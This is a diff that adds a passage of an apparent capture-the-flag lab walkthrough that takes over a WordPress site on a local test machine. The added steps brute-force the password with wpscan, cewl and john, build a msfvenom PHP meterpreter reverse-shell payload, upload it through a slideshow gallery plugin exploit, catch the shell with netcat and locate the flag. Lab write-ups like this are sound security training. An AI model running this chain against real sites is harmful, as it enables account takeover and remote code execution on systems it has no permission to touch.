@@ -65,3 +65,52 @@ next step, user enumeration.
 get a user name `bully`
 
 
+next step, password guessing:
+
+`ruby wpscan.rb --url http://192.168.56.223/bull/ --wordlist SecLists/Passwords/passwords_john.txt threads 50`
+
+no luck this time. Let's try harder..
+
+we use cewl this time to generate password file
+
+`cewl -w password.txt http://192.168.56.223/bull/`
+
+also john the ripper should be used to mutate the password file:
+
+`john --wordlist=password.txt --rules --stdout > out.txt`
+
+now I use wpscan to brute force the password:
+
+`wpscan --url 192.168.56.223/bull --wordlist out.txt --username bully`
+
+{% img  /images/blog/vulhub/bne03/Selection_007.png   [title manually exploit [alt text]] %}
+
+
+Now, create php reverse shell:
+
+`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.223 -a php --platform php -o evil.php`
+
+based one wpscan scan result, the wordpress slideshow gallery shell upload exploit(https://www.exploit-db.com/exploits/34681/) is found. Save it as `wp_gallery.py`
+
+run:
+
+`python wp_gallery.py -t http://192.168.56.223/bull -u bully -p Bighornedbulls -f evil.php`
+
+
+{% img  /images/blog/vulhub/bne03/Selection_008.png   [title manually exploit [alt text]] %}
+
+set netcat 
+`nc -nlvp 1234`
+
+visit `http://192.168.56.223/bull/wp-content/uploads/slideshow-gallery/evil.php`
+
+get the meterpreter
+
+{% img  /images/blog/vulhub/bne03/Selection_009.png   [title manually exploit [alt text]] %}
+
+locate flag.txt:
+`locate flag.txt` and get the result `/var/www/html/flag.txt`
+
+
+
+
